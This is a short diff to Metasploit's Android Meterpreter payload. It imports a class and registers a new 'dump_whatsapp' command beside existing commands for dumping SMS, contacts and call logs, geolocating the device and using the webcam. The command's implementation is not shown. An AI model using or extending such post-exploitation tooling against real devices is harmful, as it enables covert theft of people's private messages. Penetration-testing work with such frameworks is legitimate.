@@ -11,6 +11,7 @@ import com.metasploit.meterpreter.android.device_shutdown_android;
 import com.metasploit.meterpreter.android.dump_calllog_android;
 import com.metasploit.meterpreter.android.dump_contacts_android;
 import com.metasploit.meterpreter.android.dump_sms_android;
+import com.metasploit.meterpreter.android.dump_whatsapp_android;
 import com.metasploit.meterpreter.android.geolocate_android;
 import com.metasploit.meterpreter.android.stdapi_fs_file_expand_path_android;
 import com.metasploit.meterpreter.android.stdapi_sys_config_sysinfo_android;
@@ -90,6 +91,7 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand("webcam_stop", webcam_stop_android.class);
         mgr.registerCommand("webcam_get_frame", webcam_get_frame_android.class);
         
+        mgr.registerCommand("dump_whatsapp", dump_whatsapp_android.class);
         mgr.registerCommand("dump_sms", dump_sms_android.class);
         mgr.registerCommand("dump_contacts", dump_contacts_android.class);
         mgr.registerCommand("geolocate", geolocate_android.class);
